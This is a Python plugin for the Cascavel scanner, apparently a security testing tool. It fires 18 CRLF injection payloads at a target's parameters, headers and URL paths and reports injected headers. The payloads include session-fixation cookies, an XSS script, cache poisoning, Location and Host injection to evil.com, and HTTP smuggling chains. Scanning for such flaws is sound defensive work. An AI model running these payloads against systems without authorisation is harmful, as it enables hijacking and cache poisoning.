# plugins/crlf_scanner.py — Cascavel 2026 Intelligence
import requests
import urllib.parse


PARAMS = [
    "url", "redirect", "next", "return", "path", "page", "lang", "ref",
    "goto", "dest", "continue", "forward", "location", "uri", "callback",
    "out", "target", "view", "site", "domain", "host",
]

# ──────────── CRLF PAYLOADS ────────────
PAYLOADS = [
    ("%0d%0aInjected-Header:CascavelTest", "CRLF_BASIC"),
    ("%0d%0a%0d%0a<html>CRLFTest</html>", "RESPONSE_SPLITTING"),
    ("%0d%0aSet-Cookie:session=pwned;Path=/", "SESSION_FIXATION"),
    ("%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1)</script>", "XSS_PROTECTION_DISABLE"),
    ("%0d%0aCache-Control:public,max-age=31536000%0d%0a%0d%0aPOISONED", "CACHE_POISON"),
    ("%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>CRLF</h1>", "CONTENT_TYPE_OVERRIDE"),
    ("%E5%98%8A%E5%98%8DInjected:UnicodeCRLF", "UNICODE_BYPASS"),
    ("%250d%250aInjected:DoubleEncode", "DOUBLE_ENCODE"),
    ("\r\nInjected-Header:RawCRLF", "RAW_CRLF"),
    ("%0aInjected:LF-Only", "LF_ONLY"),
    ("%0d%0aAccess-Control-Allow-Origin:*", "CORS_INJECTION"),
    ("%0d%0aLocation:https://evil.com", "LOCATION_INJECTION"),
    # 2026 additions
    ("%0d%0aContent-Security-Policy:default-src%20*", "CSP_OVERRIDE"),
    ("%0d%0aX-Forwarded-For:127.0.0.1", "XFF_INJECTION"),
    ("%0d%0aHost:evil.com", "HOST_INJECTION"),
    ("%c0%0d%c0%0aInjected:OverlongCRLF", "OVERLONG_UTF8"),
    ("%0d%0aTransfer-Encoding:chunked", "TE_INJECTION"),
    ("%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>SMUGGLED</html>", "HTTP_SMUGGLE_VIA_CRLF"),
]

CRITICO_METHODS = {
    "SESSION_FIXATION", "XSS_PROTECTION_DISABLE", "CORS_INJECTION",
    "CSP_OVERRIDE", "HOST_INJECTION", "TE_INJECTION",
    "HTTP_SMUGGLE_VIA_CRLF", "LOCATION_INJECTION",
}


def _test_crlf_get(target, param, payload, method):
    """Testa CRLF injection via GET parameter."""
    url = f"http://{target}/?{param}={payload}"
    try:
        resp = requests.get(url, timeout=6, allow_redirects=False)
        return _analyze_response(resp, param, method)
    except Exception:
        return []


def _test_crlf_header(target, payload, method):
    """Testa CRLF injection via custom headers."""
    headers_to_test = [
        ("X-Custom-Header", payload),
        ("Referer", f"http://{target}/{payload}"),
        ("X-Forwarded-Host", payload),
    ]
    vulns = []
    for header_name, header_val in headers_to_test:
        try:
            resp = requests.get(f"http://{target}/",
                                 headers={header_name: header_val}, timeout=6)
            found = _analyze_response(resp, f"header:{header_name}", method)
            vulns.extend(found)
            if found:
                break
        except Exception:
            continue
    return vulns


def _test_crlf_path(target, payload, method):
    """Testa CRLF injection no path da URL."""
    try:
        resp = requests.get(f"http://{target}/{payload}", timeout=6, allow_redirects=False)
        return _analyze_response(resp, "URL_PATH", method)
    except Exception:
        return []


def _analyze_response(resp, injection_point, method):
    """Analisa resposta para sinais de CRLF injection."""
    vulns = []

    # Check injected headers
    for h_name, h_val in resp.headers.items():
        h_low = h_name.lower()
        v_low = h_val.lower()
        if "injected" in h_low or "cascaveltest" in v_low or "unicodecrlf" in v_low:
            sev = "CRITICO" if method in CRITICO_METHODS else "ALTO"
            vulns.append({
                "tipo": "CRLF_INJECTION", "metodo": method,
                "injection_point": injection_point,
                "header_injetado": f"{h_name}: {h_val}",
                "severidade": sev,
                "descricao": f"CRLF injection via {method}!",
            })
            break

    # Check body injection (response splitting)
    body_indicators = ["CRLFTest", "POISONED", "<h1>CRLF</h1>", "SMUGGLED"]
    for indicator in body_indicators:
        if indicator in resp.text:
            vulns.append({
                "tipo": "HTTP_RESPONSE_SPLITTING", "metodo": method,
                "injection_point": injection_point,
                "severidade": "CRITICO",
                "descricao": f"Full HTTP response splitting — body injetado ({indicator})!",
            })
            break

    # Check cookie injection
    for cookie_header in resp.headers.get("Set-Cookie", "").split(","):
        if "session=pwned" in cookie_header.lower():
            vulns.append({
                "tipo": "CRLF_COOKIE_INJECTION", "metodo": method,
                "injection_point": injection_point,
                "severidade": "CRITICO",
                "descricao": "Session fixation via CRLF cookie injection!",
            })

    # Check CORS injection
    acao = resp.headers.get("Access-Control-Allow-Origin", "")
    if acao == "*" and "CORS_INJECTION" in method:
        vulns.append({
            "tipo": "CRLF_CORS_INJECTION",
            "injection_point": injection_point,
            "severidade": "CRITICO",
            "descricao": "CORS wildcard injetado via CRLF!",
        })

    return vulns


def run(target, ip, open_ports, banners):
    """
    Scanner CRLF 2026-Grade — Headers, Body, Cookies, CORS, CSP, Smuggling.

    Técnicas: 18 payloads (basic/unicode/overlong/double-encode/LF-only),
    GET parameter injection, header injection (Referer/X-Forwarded-Host),
    URL path injection, response splitting, session fixation via cookie,
    CORS wildcard injection, CSP override, Host injection, TE injection,
    HTTP smuggling via CRLF chain.
    CVEs: CVE-2024-52875 (KerioControl CRLF→XSS→root).
    """
    _ = (ip, open_ports, banners)
    vulns = []

    for param in PARAMS:
        for payload, method in PAYLOADS:
            vulns.extend(_test_crlf_get(target, param, payload, method))
            if len(vulns) > 20:
                break
        if len(vulns) > 20:
            break

    # Header-based CRLF
    for payload, method in PAYLOADS[:5]:
        vulns.extend(_test_crlf_header(target, payload, method))

    # Path-based CRLF
    for payload, method in PAYLOADS[:3]:
        vulns.extend(_test_crlf_path(target, payload, method))

    return {
        "plugin": "crlf_scanner",
        "versao": "2026.1",
        "tecnicas": ["get_param", "header_injection", "path_injection",
                      "response_splitting", "cookie_injection", "cors_injection",
                      "csp_override", "http_smuggle_chain", "unicode_bypass"],
        "resultados": vulns if vulns else "Nenhuma vulnerabilidade CRLF detectada",
    }
